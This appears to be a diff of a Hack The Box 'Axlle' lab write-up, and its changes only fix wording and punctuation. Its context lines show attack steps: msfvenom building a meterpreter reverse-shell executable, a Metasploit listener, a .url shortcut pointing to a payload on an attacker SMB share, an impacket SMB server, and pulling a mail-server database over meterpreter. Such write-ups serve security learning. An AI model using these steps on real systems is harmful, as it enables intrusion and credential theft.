@@ -588,7 +588,7 @@ QBAgM=
 <p>Since the database type is <code>MSSQLCE</code>, we can download the <code>.sdf</code> file on our local machine (I used the <code>download</code> command in a meterpreter shell). The <code>.sdf</code> file is in <code>C:\Program Files (x86)\hMailServer\Database</code>.</p>
 <p><img src="/images/HTB-Axlle/sdf_file_location.png" alt="sdf file location"></p>
 <blockquote>
-<p>An <code>.sdf</code> (SQL Server Compact Edition Database) file is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).</p>
+<p>An <code>.sdf</code> file (SQL Server Compact Database File) is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).</p>
 </blockquote>
 <p>Go on <a href="https://www.rebasedata.com" target="_blank" >rebasedata</a>
 
@@ -625,7 +625,7 @@ python3 -m pyftpdlib --port 21 --write
 <pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
 </code></pre><p><img src="/images/HTB-Axlle/malicious_exe.png" alt="malicious exe file"></p>
 <ol start="2">
-<li>Set up the listener in Metasploit</li>
+<li>Set up the listener in Metasploit.</li>
 </ol>
 <pre tabindex="0"><code>use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -633,12 +633,12 @@ set lhost YOUR_IP
 set lport PORT_NUMBER
 run
 </code></pre><ol start="3">
-<li>Create the <code>.url</code> file with the following content</li>
+<li>Create the <code>.url</code> file with the following content.</li>
 </ol>
 <pre tabindex="0"><code>[InternetShortcut]
 URL=file://YOUR_IP/share/payload.exe
 </code></pre><ol start="4">
-<li>Start a SMB server and a web server</li>
+<li>Start a SMB server and a web server.</li>
 </ol>
 <pre tabindex="0"><code>impacket-smbserver -smb2support share .
 
